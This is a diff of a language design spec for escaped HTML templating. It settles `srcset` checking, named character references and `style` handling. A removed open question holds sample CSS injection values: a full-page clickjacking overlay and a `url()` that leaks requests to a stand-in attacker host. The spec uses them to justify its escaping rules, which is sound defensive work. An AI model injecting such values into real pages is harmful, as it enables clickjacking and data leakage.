@@ -151,8 +151,12 @@ text node holds `&`, and the renderer escapes it again on the way out.
 - A reference is `&`, a name or `#` with decimal digits or `#x` with hexadecimal ones, and `;`. The
   `;` is required: `&copy=2` is the text `&copy=2`, where a browser's legacy rules would read `©=2`
   in content but not in an attribute. An `&` that does not begin a reference is a plain `&`.
-- A name not in the WHATWG list, such as `&nbps;`, is a syntax error. The list is generated into a
-  table, as the Unicode tables are.
+- The names are six: the five of XML, `&amp;`, `&lt;`, `&gt;`, `&quot;`, and `&apos;`, and `&nbsp;`.
+  Any other name is a syntax error whose message names the character, so `&mdash;` says to write `—`
+  or `&#8212;`. Source is UTF-8, so a character is written as itself, and only an invisible one
+  needs a number. HTML names about 2,230 characters; carrying them all would put a table of tens of
+  kilobytes in the interpreter and the JavaScript runtime for text copied from other pages. A name
+  that is an error now can become valid later without changing any program.
 - A numeric reference must name a scalar value other than U+0000, and not one from U+0080 to U+009F,
   which browsers remap to other characters; `&#0;`, `&#xD800;`, `&#x110000;`, and `&#128;` are
   syntax errors.
@@ -289,6 +293,13 @@ so the parser enforces them with no knowledge of types.
    URL standard reads it: leading and trailing U+0000 to U+0020 removed, every tab and line break
    removed, then a scheme is `[A-Za-z][A-Za-z0-9+.-]*` followed by `:` before the first `/`, `?`, or
    `#`, compared ignoring case. A value with no scheme is relative. Literal text is never checked.
+
+   `srcset` and `imagesrcset` hold a list of URLs, and are checked as Go's `html/template` checks
+   them: the value is split into comma-separated candidates, each a URL with an optional width or
+   density such as `2x`; each URL is checked as above, an unsafe one replaced by
+   `about:invalid#ant`, and the descriptors kept as written. Browsers load these URLs only as
+   images, so the check keeps out `data:` and other schemes rather than script.
+
 4. **`<title>` and `<textarea>`** hold text only, as HTML parses them. Their content may interpolate
    strings and numbers but no `Html`, and child elements are a syntax error.
 5. **`<pre>` and `<textarea>`** keep their white space (see White space).
@@ -621,9 +632,9 @@ None until accepted. The changes would be:
 | `spec/stdlib.md`, Json                | `Json.stringify` panics on `Html`                                                                                                                                            |
 | `spec/fmt.md`                         | A section 4.10 on HTML expressions                                                                                                                                           |
 
-The fixed lists, void elements, raw text elements, boolean attributes, URL attributes, URL schemes,
-and named character references, follow the WHATWG HTML standard, and the spec names them in one
-place so that a later version of HTML is one edit.
+The fixed lists, void elements, raw text elements, boolean attributes, URL attributes, and URL
+schemes follow the WHATWG HTML standard, and the spec names them in one place so that a later
+version of HTML is one edit.
 
 ## Non-goals
 
@@ -638,56 +649,32 @@ place so that a later version of HTML is one edit.
 - **Complete protection from injection.** The rules make the common mistakes impossible: text and
   attribute values are escaped, code contexts take no interpolation, and URL attributes refuse
   dangerous schemes. They do not make every page safe. `Html.unsafe` passes anything through, a URL
-  with a safe scheme can still point somewhere hostile, `srcset`, `<meta http-equiv="refresh">`, and
-  SVG's `<animate attributeName="href" values={...}>` are not checked, and literal text the author
-  writes is trusted. The spec should describe the feature as escaping by default, never as
-  preventing injection.
+  with a safe scheme can still point somewhere hostile, `<meta http-equiv="refresh">` and SVG's
+  `<animate attributeName="href" values={...}>` are not checked, and literal text the author writes
+  is trusted. The spec should describe the feature as escaping by default, never as preventing
+  injection.
 
 ## Open questions
 
 Decided after review:
 
-| Question                                   | Decision                                                                     |
-| ------------------------------------------ | ---------------------------------------------------------------------------- |
-| `{expr}` or `${expr}`?                     | `{expr}`, as in JSX                                                          |
-| Should `null` render nothing?              | No: `null` in content is a compile error; `void` still renders nothing       |
-| `class` as an array?                       | Yes (see Attributes)                                                         |
-| Attribute spread?                          | Yes, `{...attrs}` of `Html.Attributes`, checked at run time (see Attributes) |
-| `Http.Reply.body` taking `Html`?           | No: a handler writes the doctype and `Content-Type` itself                   |
-| Attribute names with `@` or a leading `:`? | Not now                                                                      |
-| `Html.raw` or a louder name?               | `Html.unsafe`                                                                |
-| Can a library read the tree?               | Yes, `Html.nodes`, read only (see The `Html` type)                           |
-| Check the structures a browser repairs?    | No: Ant does not validate HTML; the hydrator tolerates them                  |
+| Question                                   | Decision                                                                                                             |
+| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------- |
+| `{expr}` or `${expr}`?                     | `{expr}`, as in JSX                                                                                                  |
+| Should `null` render nothing?              | No: `null` in content is a compile error; `void` still renders nothing                                               |
+| `class` as an array?                       | Yes (see Attributes)                                                                                                 |
+| Attribute spread?                          | Yes, `{...attrs}` of `Html.Attributes`, checked at run time (see Attributes)                                         |
+| `Http.Reply.body` taking `Html`?           | No: a handler writes the doctype and `Content-Type` itself                                                           |
+| Attribute names with `@` or a leading `:`? | Not now                                                                                                              |
+| `Html.raw` or a louder name?               | `Html.unsafe`                                                                                                        |
+| Can a library read the tree?               | Yes, `Html.nodes`, read only (see The `Html` type)                                                                   |
+| Check the structures a browser repairs?    | No: Ant does not validate HTML; the hydrator tolerates them                                                          |
+| `style={...}`?                             | Later. It stays a syntax error; a checked map form, as Go filters CSS values, can be added without breaking programs |
+| `srcset`?                                  | Checked per candidate, as Go does (see Unsafe contexts, rule 3)                                                      |
+| Named character references?                | Six names, the five of XML and `&nbsp;`, plus numeric references (see Text and interpolation)                        |
 
 Still open:
 
-- [ ] **`style={...}`.** It is a syntax error now because escaping keeps a value inside its quotes,
-      not inside its declaration. With ``style={`width: ${w}`}`` and `w` set to
-      `10%; position: fixed; inset: 0`, the element covers the page, a clickjacking overlay; with
-      `background: url(https://evil.example/?leak)` the browser requests a URL the attacker chose.
-      No JavaScript runs in CSS in today's browsers, so the risk is layout and requests, not code. A
-      safe form would take a map, ``style={Map{ width: `${pct}%` }}``: each name checked as a CSS
-      identifier, and a value dropped when it holds `;`, `{`, `}`, `\`, a quote, `/*`, `url(`, or
-      `image-set(`, as Go's `html/template` filters CSS values. Add the map form now, later, or
-      never, leaving classes and literal `style` text?
-- [ ] **`srcset`.** Its value is a comma-separated list of candidates, each a URL with an optional
-      width or density, `a.png 1x, b.png 2x`, and `imagesrcset` on `<link>` is the same. The safe
-      way is Go's: split the value into candidates by that grammar, check each URL as rule 3 does,
-      replace an unsafe one with `about:invalid#ant`, and keep the descriptors. Browsers load these
-      URLs only as images, so `javascript:` does not run there; what is left is a `data:` or
-      tracking URL, as with `src`. The cost is the candidate grammar in the renderer, which is
-      short. Proposed: check each candidate. Until then interpolation into `srcset` is unchecked, as
-      Non-goals says.
-- [ ] **Named character references.** HTML names about 2,230 characters, from `&amp;` to `&zwnj;`.
-      Carrying all of them is a generated table in the interpreter and in the JavaScript runtime,
-      tens of kilobytes, and in return text copied from any HTML page decodes as a browser decodes
-      it. The small alternative is the five names of XML, `&amp;`, `&lt;`, `&gt;`, `&quot;`, and
-      `&apos;`, with numeric references; any other name is a syntax error whose message names the
-      character, so `&mdash;` says to write `—` or `&#8212;`. Ant source is UTF-8, so a character
-      can be written as itself, and only an invisible one such as a non-breaking space needs a
-      number. Starting small can be undone: a name that is an error now can become valid later
-      without changing any program. Proposed: the five plus `&nbsp;`, which is common enough to earn
-      a place.
 - [ ] **Building `Html` dynamically.** `Html.nodes` reads; nothing builds an element whose name is
       data. A Markdown renderer that wants `<h1>` to `<h6>` branches on the level, and a sanitizer
       returns `Html.unsafe`. Should there be `Html.element(name, attrs, children)` that applies
